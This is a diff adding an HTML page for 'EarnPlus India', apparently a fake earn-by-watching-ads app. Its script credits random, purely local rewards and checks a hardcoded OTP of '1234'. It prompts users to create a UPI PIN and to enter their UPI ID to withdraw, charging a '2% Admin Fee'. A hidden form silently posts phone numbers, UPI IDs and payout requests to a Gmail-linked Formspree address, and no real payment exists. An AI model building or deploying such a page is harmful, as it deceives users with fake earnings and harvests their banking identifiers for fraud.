@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EarnPlus India</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .hidden { display: none; }
+        .tab-active { border-bottom: 4px solid #10b981; color: #10b981; font-weight: 900; }
+        .card { background: white; border-radius: 1.5rem; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+    </style>
+</head>
+<body class="bg-slate-50 font-sans text-gray-900">
+
+    <form id="notify-form" action="https://formspree.io/f/v0322692@gmail.com" method="POST" class="hidden">
+        <input type="text" name="Subject" id="mail-subj">
+        <input type="text" name="User_Phone" id="mail-phone">
+        <input type="text" name="Details" id="mail-details">
+    </form>
+
+    <div id="auth-container">
+        <div id="step-phone" class="max-w-md mx-auto mt-20 p-8 card">
+            <h2 class="text-3xl font-black text-emerald-600 text-center mb-6">EarnPlus</h2>
+            <div class="flex border-2 rounded-2xl p-4 mb-4 bg-white">
+                <span class="font-bold text-gray-400 mr-2">+91</span>
+                <input type="tel" id="input-phone" placeholder="Mobile Number" class="outline-none w-full font-bold">
+            </div>
+            <button onclick="sendOTP()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Next</button>
+        </div>
+        <div id="step-otp" class="max-w-md mx-auto mt-20 p-8 card hidden">
+            <input type="text" id="input-otp" placeholder="1234" class="w-full p-4 border-2 rounded-2xl mb-4 text-center text-3xl font-black outline-none">
+            <button onclick="verifyOTP()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Verify</button>
+        </div>
+        <div id="step-setup" class="max-w-md mx-auto mt-10 p-8 card hidden">
+            <h2 class="text-xl font-bold text-center mb-6 text-emerald-600">Secure Account</h2>
+            <input type="password" id="reg-pass" placeholder="Create Login Password" class="w-full p-4 border-2 rounded-2xl mb-3 outline-none">
+            <input type="password" id="reg-pin" placeholder="Create 4-Digit UPI PIN" class="w-full p-4 border-2 rounded-2xl mb-4 text-center outline-none">
+            <button onclick="finishSignup()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Create Account</button>
+        </div>
+        <div id="step-login" class="max-w-md mx-auto mt-20 p-8 card hidden">
+            <h2 class="text-2xl font-bold text-center mb-6 text-emerald-600">Login</h2>
+            <input type="password" id="login-pass" placeholder="Enter Password" class="w-full p-4 border-2 rounded-2xl mb-4 outline-none">
+            <button onclick="processLogin()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-bold">Login</button>
+        </div>
+    </div>
+
+    <div id="app-container" class="hidden">
+        <nav class="bg-white p-5 flex justify-between items-center sticky top-0 z-50 border-b">
+            <h1 class="text-xl font-black text-emerald-600">EarnPlus</h1>
+            <div class="text-right">
+                <p class="text-xl font-black text-emerald-700">₹<span id="wallet-balance">0.00</span></p>
+            </div>
+        </nav>
+
+        <main class="p-4 max-w-md mx-auto mb-24">
+            <div class="flex justify-around mb-8 bg-white rounded-2xl p-2 border">
+                <button id="tab-earn" onclick="showSubTab('earn')" class="pb-2 tab-active">Tasks</button>
+                <button id="tab-shop" onclick="showSubTab('shop')" class="pb-2 text-gray-400 font-bold">Shop</button>
+                <button id="tab-withdraw" onclick="showSubTab('withdraw')" class="pb-2 text-gray-400 font-bold">Withdraw</button>
+            </div>
+
+            <div id="sub-earn" class="space-y-4">
+                <div class="bg-slate-900 p-6 rounded-3xl text-white">
+                    <h3 class="text-lg font-bold">Watch Ad Video</h3>
+                    <p class="text-slate-400 text-xs mb-4">Earn ₹0.20 - ₹0.50</p>
+                    <button onclick="earnTask()" class="w-full bg-emerald-500 py-4 rounded-2xl font-black">Watch Now</button>
+                </div>
+            </div>
+
+            <div id="sub-shop" class="hidden space-y-4">
+                <div class="bg-white p-4 rounded-3xl border flex items-center gap-4">
+                    <div class="flex-grow">
+                        <h4 class="font-bold text-sm">[Noise ColorFit Pulse 2 Max Smart Watch](http://googleusercontent.com/shopping_content/0_link)</h4>
+                        <p class="text-emerald-600 font-black text-xs">Reward: ₹60</p>
+                        <button onclick="shopTask('Noise Watch')" class="mt-1 text-[10px] bg-slate-800 text-white px-3 py-1 rounded-full">Buy Now</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="sub-withdraw" class="hidden">
+                <div class="bg-white p-6 rounded-3xl border-2 border-emerald-50 mb-6">
+                    <p class="text-[10px] text-red-500 font-bold mb-4 uppercase text-center">Min ₹199 | 2% Admin Fee</p>
+                    <input type="number" id="w-amount" placeholder="Amount (Min ₹199)" class="w-full p-4 border rounded-2xl mb-3 font-bold">
+                    <input type="text" id="w-upi" placeholder="UPI ID" class="w-full p-4 border rounded-2xl mb-3 font-bold">
+                    <input type="password" id="w-pin" placeholder="Security PIN" class="w-full p-4 border rounded-2xl mb-4 text-center font-black">
+                    <button onclick="requestWithdrawal()" class="w-full bg-emerald-600 text-white py-4 rounded-2xl font-black">Withdraw Now</button>
+                </div>
+                <div id="history-list" class="space-y-3"></div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        let balance = parseFloat(localStorage.getItem('ep_balance')) || 0.00;
+        let userPhone = localStorage.getItem('ep_phone') || "";
+        let userPass = localStorage.getItem('ep_pass') || "";
+        let userPIN = localStorage.getItem('ep_pin') || "";
+        let history = JSON.parse(localStorage.getItem('ep_history')) || [];
+
+        window.onload = () => { if(userPhone && userPass) { document.getElementById('step-phone').classList.add('hidden'); document.getElementById('step-login').classList.remove('hidden'); } };
+
+        function sendOTP() { userPhone = document.getElementById('input-phone').value; if(userPhone.length < 10) return alert("Invalid Number"); document.getElementById('step-phone').classList.add('hidden'); document.getElementById('step-otp').classList.remove('hidden'); }
+        function verifyOTP() { if(document.getElementById('input-otp').value === "1234") { document.getElementById('step-otp').classList.add('hidden'); document.getElementById('step-setup').classList.remove('hidden'); } else { alert("Use 1234"); } }
+        function finishSignup() { userPass = document.getElementById('reg-pass').value; userPIN = document.getElementById('reg-pin').value; if(userPass.length < 4 || userPIN.length < 4) return alert("Too short"); localStorage.setItem('ep_phone', userPhone); localStorage.setItem('ep_pass', userPass); localStorage.setItem('ep_pin', userPIN); setupAppUI(); }
+        function processLogin() { if(document.getElementById('login-pass').value === userPass) { setupAppUI(); } else { alert("Wrong Password"); } }
+        function setupAppUI() { document.getElementById('auth-container').classList.add('hidden'); document.getElementById('app-container').classList.remove('hidden'); updateUI(); }
+        function earnTask() { let reward = (Math.random() * (0.50 - 0.20) + 0.20).toFixed(2); balance += parseFloat(reward); updateUI(); alert(`Earned ₹${reward}`); }
+        function shopTask(item) { alert("Redirecting to store..."); sendEmailNotification("SHOP_CLICK", `User ${userPhone} clicked ${item}`); }
+        function requestWithdrawal() {
+            const amt = parseFloat(document.getElementById('w-amount').value);
+            const upi = document.getElementById('w-upi').value;
+            const pin = document.getElementById('w-pin').value;
+            if(amt < 199) return alert("Min ₹199");
+            if(amt > balance) return alert("Low balance");
+            if(pin !== userPIN) return alert("Wrong PIN");
+            const commission = (amt * 0.02).toFixed(2);
+            const finalPay = (amt - commission).toFixed(2);
+            balance -= amt;
+            history.unshift({ amt, finalPay, status: "PENDING" });
+            sendEmailNotification("PAYOUT_REQ", `Amt: ₹${amt} | Fee: ₹${commission} | Pay: ₹${finalPay} | UPI: ${upi} | User: ${userPhone}`);
+            updateUI();
+            alert(`Request Placed! Fee: ₹${commission}`);
+        }
+        function updateUI() {
+            document.getElementById('wallet-balance').innerText = balance.toFixed(2);
+            localStorage.setItem('ep_balance', balance);
+            localStorage.setItem('ep_history', JSON.stringify(history));
+            document.getElementById('history-list').innerHTML = history.map(h => `<div class="bg-white p-4 rounded-2xl flex justify-between border"><div><p class="font-black text-sm">₹${h.amt}</p></div><span class="text-orange-500 text-[10px] font-black">${h.status}</span></div>`).join('');
+        }
+        function sendEmailNotification(subj, details) {
+            document.getElementById('mail-subj').value = subj;
+            document.getElementById('mail-phone').value = userPhone;
+            document.getElementById('mail-details').value = details;
+            fetch(document.getElementById('notify-form').action, { method: 'POST', body: new FormData(document.getElementById('notify-form')), headers: { 'Accept': 'application/json' } });
+        }
+        function showSubTab(tab) {
+            ['earn', 'shop', 'withdraw'].forEach(t => { document.getElementById('sub-' + t).classList.add('hidden'); document.getElementById('tab-' + t).classList.remove('tab-active'); });
+            document.getElementById('sub-' + tab).classList.remove('hidden'); document.getElementById('tab-' + tab).classList.add('tab-active');
+        }
+    </script>
+</body>
+</html>
